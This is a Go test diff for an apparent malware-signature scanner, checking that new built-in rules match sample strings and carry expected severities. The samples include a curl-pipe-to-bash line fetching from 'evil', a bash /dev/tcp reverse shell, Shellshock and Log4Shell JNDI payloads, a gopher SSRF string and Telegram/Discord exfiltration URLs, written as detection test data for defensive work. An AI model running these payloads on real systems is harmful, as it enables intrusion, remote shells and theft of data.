@@ -250,6 +250,53 @@ func TestExpandedBuiltinRulesV2(t *testing.T) {
 	}
 }
 
+func TestExpandedBuiltinRulesV3(t *testing.T) {
+	e := NewEngine()
+	cases := []struct{ rule, data string }{
+		{"APT_Sunburst", "assembly SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer"},
+		{"APT_Stuxnet", "loads s7otbxdx.dll into the PLC"},
+		{"LINUX_Mozi", "downloads /Mozi.m and Mozi.a"},
+		{"LINUX_BPFDoor", "opens /dev/shm/kdmtmpflush bpfdoor"},
+		{"MACOS_Atomic_Stealer", "this is the Atomic macOS Stealer build"},
+		{"ANDROID_Cerberus", "package com.cerberus.banker"},
+		{"EXFIL_Telegram_Bot", "POST https://api.telegram.org/bot123:ABC/sendMessage chat_id=42"},
+		{"EXFIL_Discord_Webhook", "exfil to https://discord.com/api/webhooks/1/abc"},
+		{"SCRIPT_Curl_Pipe_Shell", "curl http://evil/x.sh | bash"},
+		{"SCRIPT_Bash_DevTcp_Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
+		{"EXPLOIT_Shellshock", "User-Agent: () { :;}; /bin/bash -c id"},
+		{"EXPLOIT_Log4Shell_JNDI", "X-Api: ${jndi:ldap://evil/a}"},
+		{"EXPLOIT_SSRF_Gopher_Dict", "url=gopher://127.0.0.1:6379/_set"},
+		{"PACKER_ConfuserEx", "obfuscated with ConfuserEx v1.6"},
+		{"TRAIT_Process_Hollowing", "NtUnmapViewOfSection then SetThreadContext"},
+		{"TRAIT_UAC_Bypass", "hijack fodhelper.exe for elevation"},
+		{"MAL_Ursnif", "Ursnif config c2 list"},
+		{"MAL_Clipper", "calls SetClipboardData with bc1qxyz wallet"},
+	}
+	for _, c := range cases {
+		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
+			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
+		}
+	}
+	// Benign text trips none of the new rules.
+	if ms := e.Scan([]byte("a perfectly ordinary configuration file with no threats")); len(ms) != 0 {
+		t.Errorf("benign text matched: %v", matchNames(ms))
+	}
+	sev := map[string]string{}
+	for _, r := range e.rules {
+		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
+	}
+	for name, want := range map[string]string{
+		"APT_Sunburst":         "critical",
+		"PACKER_ConfuserEx":    "medium",
+		"EXPLOIT_Shellshock":   "high",
+		"TRAIT_AntiVM_Strings": "medium",
+	} {
+		if sev[name] != want {
+			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
+		}
+	}
+}
+
 func TestBuiltinModuleInjectionRule(t *testing.T) {
 	// The injection triad is a PE-only rule: it must not fire on a non-PE that
 	// merely mentions the API names as text (the module reads real imports).
